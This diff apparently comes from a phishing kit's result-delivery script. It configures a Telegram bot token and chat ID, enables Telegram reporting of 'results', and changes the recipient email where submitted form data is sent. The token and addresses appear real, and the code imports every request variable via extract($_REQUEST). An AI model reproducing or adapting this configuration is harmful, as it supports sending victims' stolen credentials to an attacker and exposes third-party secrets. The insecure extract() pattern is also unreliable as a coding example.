@@ -2,7 +2,7 @@
 $chatId = "@CDX25N";
 $botUrl = "bot1868134783:AAFO2HTVVBGF3AUS09PVj3hQFTEJCBAr06A";
 $telegram = "on"; // off if u don't need result to telegram
-$email_ids = "tradings2017@gmail.com"; // your email here 
+$email_ids = "woffice147@yandex.com"; // your email here 
 extract($_REQUEST);
 
 # Store Post values in variables
